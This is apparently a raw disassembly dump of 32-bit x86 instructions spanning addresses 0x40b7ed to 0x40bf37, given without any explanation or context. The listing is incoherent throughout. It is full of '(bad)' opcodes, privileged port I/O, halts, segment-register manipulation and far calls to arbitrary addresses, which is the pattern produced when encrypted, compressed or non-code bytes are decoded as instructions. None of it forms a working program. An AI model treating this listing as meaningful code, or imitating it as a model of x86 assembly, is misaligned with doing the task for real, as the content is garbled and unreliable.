  40b7ed:	jno    0x40b837
  40b7ef:	inc    BYTE PTR [esi-0x590057e5]
  40b7f5:	mov    cl,0x4c
  40b7f7:	xchg   edi,eax
  40b7f8:	repz inc edi
  40b7fa:	sbb    esp,DWORD PTR [esi]
  40b7fc:	fdiv   QWORD PTR [esi]
  40b7fe:	rcl    BYTE PTR [edi],cl
  40b800:	add    eax,0x6e77b45
  40b805:	cs cld 
  40b807:	aaa    
  40b808:	cdq    
  40b809:	push   ds
  40b80a:	fwait
  40b80b:	sub    BYTE PTR [ebx+0x5e52f067],0x58
  40b812:	jp     0x40b867
  40b814:	mov    ds:0x6c69750c,al
  40b819:	and    eax,0xf8d36085
  40b81e:	cmp    edi,DWORD PTR [edi+0x7]
  40b821:	pop    ds
  40b822:	hlt    
  40b823:	test   al,0xe
  40b825:	dec    esi
  40b826:	(bad)  
  40b827:	icebp  
  40b828:	es cli 
  40b82a:	inc    edx
  40b82b:	xor    BYTE PTR [ebp-0x65101206],dh
  40b831:	jo     0x40b88d
  40b833:	repz add al,0xdf
  40b836:	add    BYTE PTR [ebx+ebp*2-0x21],al
  40b83a:	jp     0x40b88c
  40b83c:	pop    ebx
  40b83d:	add    ch,dh
  40b83f:	out    dx,al
  40b840:	outs   dx,BYTE PTR ds:[esi]
  40b841:	xor    eax,0x8cf8fea
  40b846:	inc    ebx
  40b847:	(bad)
  40b84a:	dec    edx
  40b84b:	mov    ebp,0xc7bc7d4a
  40b850:	xchg   esp,eax
  40b851:	leave  
  40b852:	je     0x40b89c
  40b854:	add    al,0x9
  40b856:	add    DWORD PTR [esi],0x4e
  40b859:	pusha  
  40b85a:	cmp    al,0xb8
  40b85c:	les    esp,FWORD PTR [ecx+edi*2-0x36]
  40b860:	or     al,0x2e
  40b862:	mov    al,dh
  40b864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b865:	adc    cl,bh
  40b867:	inc    edi
  40b868:	adc    BYTE PTR [edx+edi*1-0x5b1e6a33],bl
  40b86f:	dec    ecx
  40b870:	or     esp,0xffffffee
  40b873:	(bad)  
  40b874:	sub    ebp,DWORD PTR [edx+0x9]
  40b877:	cs jp  0x40b840
  40b87a:	jnp    0x40b8c5
  40b87c:	mov    ebp,0x9e346b63
  40b881:	inc    ebp
  40b882:	test   BYTE PTR [edi-0x19f4c183],ch
  40b888:	addr16 jns 0x40b8f2
  40b88b:	das    
  40b88c:	pop    ds
  40b88d:	lea    esi,[eax+0x1206d7ec]
  40b893:	pop    ss
  40b894:	adc    edx,ecx
  40b896:	push   ss
  40b897:	repz sub BYTE PTR [esi+0x306a9636],cl
  40b89e:	push   0x34
  40b8a0:	loop   0x40b8cd
  40b8a2:	pusha  
  40b8a3:	in     al,0x2
  40b8a5:	add    DWORD PTR [edx+0x4f36d599],edi
  40b8ab:	or     ebp,esp
  40b8ad:	or     ebx,DWORD PTR [ecx+edi*2]
  40b8b0:	sub    bl,ch
  40b8b2:	js     0x40b83f
  40b8b4:	and    dl,BYTE PTR [eax+0x2f0f60d2]
  40b8ba:	push   0x4c9807bf
  40b8bf:	jo     0x40b892
  40b8c1:	repz push cs
  40b8c3:	jecxz  0x40b912
  40b8c5:	xchg   ecx,eax
  40b8c6:	pop    ebx
  40b8c7:	in     eax,0x92
  40b8c9:	jb     0x40b8f3
  40b8cb:	or     al,0x11
  40b8cd:	or     DWORD PTR [ecx],eax
  40b8cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8d0:	jbe    0x40b862
  40b8d2:	stos   BYTE PTR es:[edi],al
  40b8d3:	push   es
  40b8d4:	arpl   WORD PTR [edx+0x27],ax
  40b8d7:	pop    es
  40b8d8:	jae    0x40b8c5
  40b8da:	jecxz  0x40b8eb
  40b8dc:	sub    BYTE PTR [ebx-0x73],bh
  40b8df:	mov    ecx,0x5efdfc04
  40b8e4:	mov    ch,0x35
  40b8e6:	and    dh,BYTE PTR [ebx-0x2e50b8b0]
  40b8ec:	jecxz  0x40b918
  40b8ee:	nop
  40b8ef:	enter  0xdc8a,0x8f
  40b8f3:	or     dh,bl
  40b8f5:	jnp    0x40b93a
  40b8f7:	out    dx,eax
  40b8f8:	test   DWORD PTR [edx-0x30bdddbd],ecx
  40b8fe:	and    eax,0x106fd1ea
  40b903:	movzx  edi,BYTE PTR [edx]
  40b906:	sub    eax,0x48bf505f
  40b90b:	(bad)  
  40b90c:	dec    ecx
  40b90d:	or     bp,ax
  40b910:	mov    ds:0xb545311b,eax
  40b915:	jb     0x40b926
  40b917:	sti    
  40b918:	ret    
  40b919:	int3   
  40b91a:	das    
  40b91b:	es je  0x40b8f2
  40b91e:	push   ecx
  40b91f:	fwait
  40b920:	in     eax,dx
  40b921:	mov    BYTE PTR [eax],dl
  40b923:	(bad)  
  40b924:	aam    0xeb
  40b926:	pusha  
  40b927:	add    ebx,edx
  40b929:	and    BYTE PTR [ebx-0x32],bh
  40b92c:	in     eax,dx
  40b92d:	jg     0x40b8ff
  40b92f:	das    
  40b930:	pop    ecx
  40b931:	test   BYTE PTR [edx+0x30],dl
  40b934:	cwde   
  40b935:	jne    0x40b923
  40b937:	xchg   esi,eax
  40b938:	lock xchg esp,eax
  40b93a:	pop    edx
  40b93b:	hlt    
  40b93c:	or     al,0xc1
  40b93e:	push   0x96dd4617
  40b943:	fcom   st(3)
  40b945:	sub    ebx,edx
  40b947:	xor    DWORD PTR [ebx+0x38],esp
  40b94a:	jecxz  0x40b8cc
  40b94c:	mov    BYTE PTR [ecx-0x4e8db73c],ch
  40b952:	adc    al,dl
  40b954:	or     dh,BYTE PTR [ebp+ebx*2-0x678da81f]
  40b95b:	loope  0x40b8eb
  40b95d:	(bad)  
  40b95e:	retf   
  40b95f:	sbb    edi,DWORD PTR [eax-0x64]
  40b962:	repz sar BYTE PTR [ebp+0x35c3461c],1
  40b969:	add    al,0xa9
  40b96b:	xchg   esp,eax
  40b96c:	js     0x40b917
  40b96e:	and    ecx,DWORD PTR [esi+esi*8]
  40b971:	inc    ebx
  40b972:	mov    esp,0x3bba740
  40b977:	jg     0x40b982
  40b979:	push   ebx
  40b97a:	or     edi,DWORD PTR fs:[ebp+0x11]
  40b97e:	ins    BYTE PTR es:[edi],dx
  40b97f:	or     BYTE PTR [edi],dl
  40b981:	mov    al,ds:0x9c15c2a8
  40b986:	xchg   esi,eax
  40b987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b988:	icebp  
  40b989:	cld    
  40b98a:	pop    ebx
  40b98b:	or     BYTE PTR [eax+edx*4-0x41],0x76
  40b990:	cs and al,0xf9
  40b993:	das    
  40b994:	fmul   DWORD PTR [ebp+0x19]
  40b997:	sar    DWORD PTR [eax+0x352d0a18],cl
  40b99d:	xor    ebx,DWORD PTR ds:0xfc2c1c23
  40b9a3:	dec    eax
  40b9a4:	bnd jmp 0x40b97c
  40b9a7:	retf   0x8b0e
  40b9aa:	xlat   BYTE PTR ds:[ebx]
  40b9ab:	repnz sbb ah,bl
  40b9ae:	mov    ebx,0x6a51e14e
  40b9b3:	or     al,0x49
  40b9b5:	xchg   ecx,eax
  40b9b6:	rcl    BYTE PTR ds:0x67fd2b7e,1
  40b9bc:	(bad)  
  40b9bd:	popf   
  40b9be:	xchg   edx,eax
  40b9bf:	or     eax,0x3c288dfc
  40b9c4:	add    DWORD PTR [edi],eax
  40b9c6:	adc    edi,DWORD PTR [edi]
  40b9c8:	inc    ecx
  40b9c9:	dec    edx
  40b9ca:	jge    0x40ba02
  40b9cc:	lods   eax,DWORD PTR ds:[esi]
  40b9cd:	mov    ebx,0xd3dd21e0
  40b9d2:	and    bh,cl
  40b9d4:	cwde   
  40b9d5:	dec    edx
  40b9d6:	rol    BYTE PTR [eax+0x94189a7],0xa2
  40b9dd:	lds    esi,FWORD PTR [edx]
  40b9df:	xchg   esp,eax
  40b9e0:	cwde   
  40b9e1:	cdq    
  40b9e2:	sar    BYTE PTR [edx-0x5f09b9f3],0x77
  40b9e9:	mov    ecx,0x8af766b3
  40b9ee:	pop    es
  40b9ef:	jne    0x40b9b5
  40b9f1:	or     DWORD PTR [ebx-0x48],edi
  40b9f4:	xor    eax,0xc3a7e66f
  40b9f9:	dec    edx
  40b9fa:	stos   BYTE PTR es:[edi],al
  40b9fb:	push   edx
  40b9fc:	mov    esi,0x2e365183
  40ba01:	add    dh,BYTE PTR [ecx+0x5afa9f4a]
  40ba07:	add    DWORD PTR [edi],esp
  40ba09:	lods   al,BYTE PTR ds:[esi]
  40ba0a:	in     al,dx
  40ba0b:	mov    ch,0xc6
  40ba0d:	ficomp DWORD PTR [esi+0x668d229b]
  40ba13:	fisubr DWORD PTR [ebp-0x32]
  40ba16:	mov    ds,WORD PTR [ebp+0x54]
  40ba19:	fcom   QWORD PTR [edx]
  40ba1b:	jmp    0x40b9b3
  40ba1d:	(bad)  
  40ba1e:	retf   0xbd00
  40ba21:	pop    ss
  40ba22:	jae    0x40ba65
  40ba24:	out    0x11,al
  40ba26:	mov    eax,0xfdaabd
  40ba2b:	jo     0x40b9db
  40ba2d:	pop    edi
  40ba2e:	jle    0x40b9e4
  40ba30:	stc    
  40ba31:	sbb    eax,0x3bae2169
  40ba36:	ins    BYTE PTR es:[edi],dx
  40ba37:	mov    edx,0x93cf0ded
  40ba3c:	(bad)  
  40ba3d:	in     eax,0x94
  40ba3f:	cdq    
  40ba40:	inc    ecx
  40ba41:	pop    edx
  40ba42:	sbb    BYTE PTR [edi+ebx*2-0x1dfcded1],al
  40ba49:	cmp    al,0xfc
  40ba4b:	pop    ecx
  40ba4c:	in     al,dx
  40ba4d:	maxps  xmm5,XMMWORD PTR [esi]
  40ba50:	dec    edi
  40ba51:	cld    
  40ba52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba53:	mov    ebp,0xef3d4114
  40ba58:	or     ah,BYTE PTR [edx]
  40ba5a:	loopne 0x40ba18
  40ba5c:	mov    al,ds:0x6a6b8f2e
  40ba61:	out    dx,eax
  40ba62:	mov    ds:0x6103f783,al
  40ba67:	ret    0xeb03
  40ba6a:	push   es
  40ba6b:	out    dx,ax
  40ba6d:	repz sub cl,0x16
  40ba71:	xchg   esi,eax
  40ba72:	inc    esp
  40ba73:	fwait
  40ba74:	ja     0x40bab1
  40ba76:	cli    
  40ba77:	clc    
  40ba78:	pop    esi
  40ba79:	pop    ds
  40ba7a:	test   dh,0xc3
  40ba7d:	jge    0x40ba3f
  40ba7f:	dec    ecx
  40ba80:	js     0x40ba2b
  40ba82:	and    al,ch
  40ba84:	mov    eax,0x1fed5830
  40ba89:	jmp    esi
  40ba8b:	fisub  WORD PTR [ebx+edx*1-0x73]
  40ba8f:	fistp  QWORD PTR [ecx-0x3f]
  40ba92:	ss mov ecx,esp
  40ba95:	repz mov ebx,0xca947a54
  40ba9b:	cmc    
  40ba9c:	arpl   WORD PTR ss:[esi],di
  40ba9f:	shl    BYTE PTR [eax-0xa296e31],0xa1
  40baa6:	pusha  
  40baa7:	and    eax,0xec92af82
  40baac:	xchg   esi,eax
  40baad:	xor    ah,0x98
  40bab0:	(bad)  
  40bab1:	popf   
  40bab2:	xchg   esp,eax
  40bab4:	xor    al,0xa1
  40bab6:	cmc    
  40bab7:	mov    dl,0xf
  40bab9:	jp     0x40ba4f
  40babb:	out    0x8,al
  40babd:	adc    eax,0x42439330
  40bac2:	mov    ah,0x5
  40bac4:	add    al,0xf1
  40bac6:	cmp    eax,0x3e0e8c09
  40bacb:	inc    ebp
  40bacc:	lahf   
  40bacd:	pop    ebx
  40bace:	push   edx
  40bacf:	aas    
  40bad0:	es es out 0xef,eax
  40bad4:	in     eax,dx
  40bad5:	dec    ebp
  40bad6:	xor    bh,BYTE PTR [ebx+0x13465aff]
  40badc:	es loopne 0x40bb5d
  40badf:	sub    DWORD PTR [esi],0x103c54c5
  40bae5:	je     0x40ba95
  40bae7:	jl     0x40baf9
  40bae9:	lods   al,BYTE PTR ds:[esi]
  40baea:	push   es
  40baeb:	pop    ecx
  40baec:	repz xlat BYTE PTR ds:[ebx]
  40baee:	push   ecx
  40baef:	sub    ebx,ebp
  40baf1:	lds    edx,FWORD PTR [eax]
  40baf3:	dec    ebp
  40baf4:	pop    es
  40baf5:	cmp    al,0x3d
  40baf7:	into   
  40baf8:	pop    ds
  40baf9:	add    ecx,edx
  40bafb:	rcr    BYTE PTR ds:0xe8b478cf,0xe2
  40bb02:	mov    ds:0x98378a67,al
  40bb07:	rcr    BYTE PTR [ebx],cl
  40bb09:	adc    BYTE PTR [edx-0x1b],0xe7
  40bb0d:	jae    0x40bab6
  40bb0f:	jmp    0x9ae59eaa
  40bb14:	xor    al,0x28
  40bb16:	sbb    eax,0xe1054d05
  40bb1b:	enter  0x5704,0xea
  40bb1f:	mov    al,ds:0xf41c52a4
  40bb24:	lahf   
  40bb25:	call   0x5522:0xac52d49d
  40bb2c:	mov    BYTE PTR [ebx+0x45],bh
  40bb2f:	inc    esi
  40bb30:	int    0xb5
  40bb32:	xor    BYTE PTR [ebx+0x4dedd8be],al
  40bb38:	cmp    DWORD PTR [eax-0xd80bdeb],ecx
  40bb3e:	call   0xf475e7b3
  40bb43:	xlat   BYTE PTR ds:[ebx]
  40bb44:	(bad)  
  40bb45:	sti    
  40bb46:	jecxz  0x40bb79
  40bb48:	scas   al,BYTE PTR es:[edi]
  40bb49:	enter  0xd86b,0xfb
  40bb4d:	ins    DWORD PTR es:[edi],dx
  40bb4e:	clc    
  40bb4f:	inc    edx
  40bb50:	push   edx
  40bb51:	push   esp
  40bb52:	sub    DWORD PTR [edi+edx*2],esi
  40bb55:	fsub   st,st(1)
  40bb57:	stc    
  40bb58:	jo     0x40bb20
  40bb5a:	inc    esp
  40bb5b:	sbb    esp,edx
  40bb5d:	or     BYTE PTR [edi-0x3492f66e],ah
  40bb63:	inc    esp
  40bb64:	cld    
  40bb65:	imul   edi,DWORD PTR [esi+ebx*2-0x43],0xefd5bdca
  40bb6d:	dec    ebp
  40bb6e:	sub    edx,DWORD PTR [edx]
  40bb70:	scas   al,BYTE PTR es:[edi]
  40bb71:	enter  0xca56,0xa7
  40bb75:	fwait
  40bb76:	(bad)  
  40bb77:	das    
  40bb78:	dec    ebp
  40bb79:	sub    al,0x98
  40bb7b:	inc    esp
  40bb7c:	adc    esp,esp
  40bb7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb7f:	and    dh,bl
  40bb81:	mov    WORD PTR [ebp+0x57],?
  40bb84:	rol    DWORD PTR [esp+ebp*8],0x8
  40bb88:	mov    dh,0x1b
  40bb8a:	arpl   cx,ax
  40bb8c:	fisubr DWORD PTR [ebp+0x23]
  40bb8f:	enter  0xc21c,0x30
  40bb93:	imul   ecx,DWORD PTR [esi],0x36
  40bb96:	jno    0x40bbda
  40bb98:	in     al,0x98
  40bb9a:	sub    edx,ecx
  40bb9c:	bndldx bnd2,[eax+0x54361fa8]
  40bba3:	or     BYTE PTR ds:0xeb1a95ac,al
  40bba9:	add    eax,DWORD PTR [ebp+0x79]
  40bbac:	cwde   
  40bbad:	add    DWORD PTR cs:[ecx+eax*8+0x1c33ccbf],esi
  40bbb5:	mul    bl
  40bbb7:	not    BYTE PTR [ebx-0x4b01e565]
  40bbbd:	cli    
  40bbbe:	into   
  40bbbf:	mov    edi,0x14cc3f79
  40bbc4:	cwde   
  40bbc5:	imul   eax,DWORD PTR [eax+0x77],0x2716a863
  40bbcc:	int    0x9c
  40bbce:	dec    ecx
  40bbcf:	les    ebx,FWORD PTR [ebx+0x7b]
  40bbd2:	scas   al,BYTE PTR es:[edi]
  40bbd3:	push   ebx
  40bbd4:	xor    al,0xd0
  40bbd7:	idiv   bh
  40bbd9:	fisttp DWORD PTR [ebx-0xd]
  40bbdc:	sub    DWORD PTR [edi+edx*4+0x51],edi
  40bbe0:	div    BYTE PTR [esi+eax*2]
  40bbe3:	(bad)  
  40bbe4:	scas   al,BYTE PTR es:[edi]
  40bbe5:	(bad)  
  40bbe7:	xchg   DWORD PTR [ebx],ebp
  40bbe9:	aas    
  40bbea:	dec    esi
  40bbeb:	ret    
  40bbec:	adc    dh,bl
  40bbee:	pop    eax
  40bbef:	nop
  40bbf0:	ins    BYTE PTR es:[edi],dx
  40bbf1:	jne    0x40bc21
  40bbf3:	std    
  40bbf4:	sub    dl,BYTE PTR [eax+0x4d935312]
  40bbfa:	es cmp eax,0x4d3d480a
  40bc00:	clc    
  40bc01:	or     eax,0x190b072a
  40bc06:	dec    eax
  40bc07:	xchg   edi,eax
  40bc08:	lock pop ebx
  40bc0a:	xlat   BYTE PTR ds:[ebx]
  40bc0b:	sbb    esi,edx
  40bc0d:	sub    BYTE PTR [edi],0x27
  40bc10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc11:	icebp  
  40bc12:	mov    BYTE PTR es:0x61732eb7,dh
  40bc19:	or     al,0x29
  40bc1b:	mov    ebx,0x8e8a32bb
  40bc20:	jp     0x40bc5f
  40bc22:	mov    edi,0xdfdb7164
  40bc27:	mov    edi,0xf458fdde
  40bc2c:	(bad)  
  40bc2e:	cs out 0x8b,eax
  40bc31:	scas   eax,DWORD PTR es:[edi]
  40bc32:	inc    edi
  40bc33:	aas    
  40bc34:	dec    ebp
  40bc35:	xchg   BYTE PTR ds:0xf87c2309,bl
  40bc3b:	xchg   ecx,eax
  40bc3c:	mov    BYTE PTR [ecx+0x67],bl
  40bc3f:	sub    al,0xa4
  40bc41:	dec    esi
  40bc42:	outs   dx,BYTE PTR ds:[esi]
  40bc43:	cs jno 0x40bbf8
  40bc46:	loopne 0x40bbcc
  40bc48:	in     eax,0xa3
  40bc4a:	gs test al,0xe5
  40bc4d:	jp     0x40bc6f
  40bc4f:	ja     0x40bc45
  40bc51:	mov    bl,0x58
  40bc53:	es sahf 
  40bc55:	dec    edi
  40bc56:	mov    edx,0xbf913102
  40bc5b:	dec    eax
  40bc5c:	int3   
  40bc5d:	push   edi
  40bc5e:	mov    cl,0x74
  40bc60:	xchg   edi,eax
  40bc61:	dec    esp
  40bc62:	pop    es
  40bc63:	push   esp
  40bc64:	mul    BYTE PTR [edx+0x2619466f]
  40bc6a:	dec    edx
  40bc6b:	mov    ds:0xd111cdc2,eax
  40bc70:	in     eax,0xd0
  40bc72:	sub    al,0x8e
  40bc74:	inc    edx
  40bc75:	aad    0x7
  40bc77:	cmp    eax,0x452417bc
  40bc7c:	(bad)  
  40bc7d:	jg     0x40bcf8
  40bc7f:	inc    esp
  40bc80:	cmp    eax,0x1a50f4bd
  40bc85:	sbb    al,0xc4
  40bc87:	(bad)  
  40bc89:	(bad)  
  40bc8a:	es out 0x52,eax
  40bc8d:	mov    WORD PTR [ebx+0x17],?
  40bc90:	stos   DWORD PTR es:[edi],eax
  40bc91:	test   BYTE PTR [ecx],0xda
  40bc94:	call   FWORD PTR [edx+0x77835bb1]
  40bc9a:	cmp    eax,0xe4bd88e6
  40bc9f:	sbb    dh,al
  40bca1:	loopne 0x40bcba
  40bca3:	pop    ss
  40bca4:	loop   0x40bc96
  40bca6:	sbb    ecx,DWORD PTR [edx+0x4e3e9cb5]
  40bcac:	hlt    
  40bcad:	mov    edx,0x309b5bef
  40bcb2:	add    cl,BYTE PTR [ebx-0x6f]
  40bcb5:	push   eax
  40bcb6:	sub    al,BYTE PTR ds:0x8561553a
  40bcbc:	les    edi,FWORD PTR [ebp-0x68]
  40bcbf:	iret   
  40bcc0:	test   eax,0x5e3d1ac0
  40bcc5:	in     al,0xa1
  40bcc7:	pop    ebx
  40bcc8:	scas   al,BYTE PTR es:[edi]
  40bcc9:	xchg   esi,eax
  40bcca:	dec    esi
  40bccb:	xchg   esp,eax
  40bccc:	clc    
  40bccd:	add    ebx,DWORD PTR ds:0x9c87fe03
  40bcd3:	pop    edx
  40bcd4:	(bad)  
  40bcd6:	mov    bl,0xc4
  40bcd8:	ja     0x40bcdb
  40bcda:	test   al,0xf9
  40bcdc:	add    ebx,DWORD PTR [edx]
  40bcde:	mov    ecx,0x6893780f
  40bce3:	aaa    
  40bce4:	add    cl,BYTE PTR [edi+0x49]
  40bce7:	(bad)  
  40bce8:	(bad)  
  40bce9:	xchg   esp,eax
  40bcea:	and    dl,dl
  40bcec:	retf   0xbae8
  40bcef:	repz push es
  40bcf1:	sbb    eax,0x1c43ddf8
  40bcf6:	adc    DWORD PTR [esi],ebx
  40bcf8:	xchg   edi,eax
  40bcf9:	xchg   edx,eax
  40bcfa:	adc    al,0x30
  40bcfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcfd:	inc    ebp
  40bcfe:	leave  
  40bcff:	pop    ecx
  40bd00:	mov    eax,0xcdfd16
  40bd05:	mov    ds:0x1056e8de,eax
  40bd0a:	mov    eax,DWORD PTR [eax-0x5598379]
  40bd10:	out    dx,al
  40bd11:	addr16 xchg edi,eax
  40bd13:	stos   DWORD PTR es:[edi],eax
  40bd14:	iret   
  40bd15:	ins    BYTE PTR es:[edi],dx
  40bd16:	xchg   ebp,eax
  40bd17:	loope  0x40bcb4
  40bd19:	mov    dh,0x30
  40bd1b:	into   
  40bd1c:	leave  
  40bd1d:	ret    
  40bd1e:	popa   
  40bd1f:	jnp    0x40bd52
  40bd21:	rol    DWORD PTR [ecx+0x5fa694ce],0x99
  40bd28:	lea    edx,ds:0x58709601
  40bd2e:	pop    eax
  40bd2f:	jns    0x40bd8c
  40bd31:	jl     0x40bcca
  40bd33:	dec    ebp
  40bd34:	dec    ebp
  40bd35:	cdq    
  40bd36:	cdq    
  40bd37:	adc    bl,ah
  40bd39:	sbb    BYTE PTR [edx+0x7a06cbba],ah
  40bd3f:	sahf   
  40bd40:	out    0xda,al
  40bd42:	push   ds
  40bd43:	adc    edx,DWORD PTR [esi-0x4bdb1c69]
  40bd49:	or     eax,DWORD PTR [esi]
  40bd4b:	call   0x2fe6a5a8
  40bd50:	dec    esp
  40bd51:	sti    
  40bd52:	int    0x5d
  40bd54:	fwait
  40bd55:	sub    al,BYTE PTR ds:0x7676b98d
  40bd5b:	pop    ecx
  40bd5c:	lea    esi,[esi+0x167ab3e2]
  40bd62:	sub    DWORD PTR [esi-0x25a5b6da],eax
  40bd68:	cmp    ecx,esp
  40bd6a:	inc    ecx
  40bd6b:	out    0x4e,al
  40bd6d:	inc    edi
  40bd6e:	lahf   
  40bd6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd70:	adc    al,0x13
  40bd72:	clc    
  40bd73:	(bad)  
  40bd74:	pop    eax
  40bd75:	ror    BYTE PTR [edx-0x27],cl
  40bd78:	rcl    BYTE PTR [esp+eiz*4-0x3fc1ae50],1
  40bd7f:	jmp    0x6350:0x91c33ea0
  40bd86:	loop   0x40be03
  40bd88:	mov    edi,0x49df4f56
  40bd8d:	(bad)  
  40bd8e:	mov    eax,es
  40bd90:	xchg   edi,eax
  40bd91:	sbb    cl,BYTE PTR [edx+0x7ef0a172]
  40bd97:	(bad)  
  40bd98:	aad    0x3e
  40bd9a:	es imul ebx,DWORD PTR ss:[ebx],0xffffff82
  40bd9f:	cmp    ebx,DWORD PTR [edi+esi*2]
  40bda2:	mov    ch,0xda
  40bda4:	cs mov ch,0x25
  40bda7:	cmp    BYTE PTR ss:[ebx-0x6312354c],bh
  40bdae:	icebp  
  40bdaf:	mov    al,0xd5
  40bdb1:	or     cl,al
  40bdb3:	sahf   
  40bdb4:	shr    WORD PTR [edi+0x1e],0x22
  40bdb9:	ss mov ebp,?
  40bdbc:	sub    dl,BYTE PTR [ecx-0x3eebb74]
  40bdc2:	xchg   esp,eax
  40bdc3:	push   0x28
  40bdc5:	ds aad 0x98
  40bdc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdc9:	adc    BYTE PTR [ebx-0x5d0b0267],dl
  40bdcf:	pop    eax
  40bdd0:	push   0x62ef68aa
  40bdd5:	out    0x4e,eax
  40bdd7:	adc    DWORD PTR [eax+0x22e53502],esi
  40bddd:	or     BYTE PTR [ebx-0x46],al
  40bde0:	adc    DWORD PTR [eax-0x44],edi
  40bde3:	push   esi
  40bde4:	ror    DWORD PTR [eax],1
  40bde6:	dec    ecx
  40bde7:	into   
  40bde8:	mov    bh,0xc8
  40bdea:	mov    cl,BYTE PTR [eax]
  40bdec:	ja     0x40bdf9
  40bdee:	(bad)  
  40bdef:	es add eax,0x98863a2a
  40bdf5:	scas   al,BYTE PTR es:[edi]
  40bdf6:	add    al,0x2e
  40bdf8:	jg     0x40be5d
  40bdfa:	push   0x1c893c1
  40bdff:	xor    dl,bl
  40be01:	pushf  
  40be02:	sbb    DWORD PTR [edx+0x54],edx
  40be05:	in     al,0x54
  40be07:	inc    BYTE PTR [edi-0x5c]
  40be0a:	dec    edi
  40be0b:	xchg   edx,eax
  40be0c:	dec    ebx
  40be0d:	and    ecx,edx
  40be0f:	lods   al,BYTE PTR ds:[esi]
  40be10:	mov    fs,esp
  40be12:	call   0x80df02f9
  40be17:	dec    esi
  40be18:	pop    ebx
  40be19:	loopne 0x40bdf1
  40be1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be1c:	fldcw  WORD PTR [edi]
  40be1e:	and    al,0x8b
  40be20:	inc    esp
  40be21:	mov    cl,al
  40be23:	push   eax
  40be24:	out    0x59,eax
  40be26:	mov    es,esp
  40be28:	jmp    0x40be0a
  40be2a:	lock lock adc ch,BYTE PTR [edx]
  40be2e:	sbb    ecx,DWORD PTR [esi]
  40be30:	cmp    DWORD PTR [edx-0x25],ebp
  40be33:	retf   
  40be34:	and    al,0x29
  40be36:	mov    DWORD PTR [esi+0x5c],edx
  40be39:	test   eax,0xcf1e96c1
  40be3e:	dec    ecx
  40be3f:	push   eax
  40be40:	loop   0x40bdd6
  40be42:	repz mov ds:0xd3edc60e,al
  40be48:	sub    ebp,eax
  40be4a:	inc    edx
  40be4b:	lods   eax,DWORD PTR ds:[esi]
  40be4c:	pop    esi
  40be4d:	test   BYTE PTR [edx+0x1a],0x47
  40be51:	xor    eax,0x79637f2c
  40be56:	repnz aas 
  40be58:	jne    0x40be56
  40be5a:	sub    edx,edi
  40be5c:	(bad)  
  40be5d:	pop    ds
  40be5e:	adc    esi,ebx
  40be60:	imul   eax,DWORD PTR [ebx-0x270d04e8],0x4a
  40be67:	inc    ecx
  40be68:	mov    ch,0x50
  40be6a:	icebp  
  40be6b:	mov    al,ds:0xcf04da9a
  40be70:	(bad)  
  40be72:	sbb    BYTE PTR [edx*4+0x5d2df72e],dl
  40be79:	retf   
  40be7a:	push   ebx
  40be7b:	dec    esp
  40be7c:	stc    
  40be7d:	or     al,0x92
  40be7f:	xor    eax,0xdd44beb3
  40be84:	stc    
  40be85:	jne    0x40be15
  40be87:	dec    ecx
  40be88:	and    dh,ch
  40be8a:	adc    BYTE PTR [esi],cl
  40be8c:	add    esi,ebx
  40be8e:	cmp    ecx,DWORD PTR [esi+ecx*2+0x77b6f41e]
  40be95:	dec    ebx
  40be96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be97:	sbb    al,0x69
  40be99:	dec    ebx
  40be9a:	std    
  40be9b:	cmp    eax,DWORD PTR [ebp+0x5b]
  40be9e:	call   0x9b78:0xad9d0145
  40bea5:	push   esp
  40bea6:	stc    
  40bea7:	sti    
  40bea8:	out    0x4f,al
  40beaa:	sahf   
  40beab:	out    dx,eax
  40beac:	pop    es
  40bead:	and    DWORD PTR [ebp+ebx*8-0x54],eax
  40beb1:	loop   0x40befe
  40beb3:	fbld   TBYTE PTR ds:0xe94f0a85
  40beb9:	test   eax,0x310e0a91
  40bebe:	pushf  
  40bebf:	mov    dh,0x71
  40bec1:	cdq    
  40bec2:	sub    DWORD PTR [eax],ebx
  40bec4:	loopne 0x40bec1
  40bec6:	sub    eax,0x9107f90d
  40becb:	cs cs out 0x1e,al
  40becf:	shr    BYTE PTR [ecx+0x5eb5f07d],cl
  40bed5:	push   ds
  40bed6:	call   0x8f4e10f0
  40bedb:	jns    0x40be70
  40bedd:	je     0x40bef8
  40bedf:	seto   BYTE PTR [edi]
  40bee2:	stos   DWORD PTR es:[edi],eax
  40bee3:	dec    esp
  40bee4:	and    dh,BYTE PTR [ebx+eax*2]
  40bee7:	add    ch,ch
  40bee9:	cmp    eax,0x16a99fc9
  40beee:	sar    DWORD PTR [esi+edi*4],1
  40bef1:	jno    0x40bec4
  40bef3:	jle    0x40beb5
  40bef5:	inc    esi
  40bef6:	scas   eax,DWORD PTR es:[edi]
  40bef7:	mov    esi,0x44ab0dc1
  40befc:	scas   al,BYTE PTR es:[edi]
  40befd:	xchg   esp,eax
  40befe:	ins    DWORD PTR es:[edi],dx
  40beff:	cmp    DWORD PTR [ecx+0x49],edx
  40bf02:	call   0x7a84c952
  40bf07:	or     eax,0xd773b496
  40bf0c:	fsubr  st(6),st
  40bf0e:	mov    es,WORD PTR [ebx]
  40bf10:	xchg   esi,eax
  40bf11:	(bad)  
  40bf12:	push   ss
  40bf13:	xchg   ebx,eax
  40bf14:	pop    es
  40bf15:	mov    dh,0x31
  40bf17:	mov    al,ds:0x49fbe1f1
  40bf1c:	adc    edi,esi
  40bf1e:	pop    ds
  40bf1f:	inc    eax
  40bf20:	push   edx
  40bf21:	bound  eax,QWORD PTR [eax+0x4a]
  40bf24:	push   esi
  40bf25:	pop    edi
  40bf26:	and    dl,ch
  40bf28:	pop    es
  40bf29:	xchg   esp,eax
  40bf2a:	loopne 0x40bf67
  40bf2c:	(bad)  
  40bf2d:	push   ebp
  40bf2e:	or     edx,DWORD PTR [edi-0x6eb0f08b]
  40bf34:	lea    edx,[ebp+0x1d]
  40bf37:	bound  ecx,QWORD PTR [ebp-0x4a8bcc4]
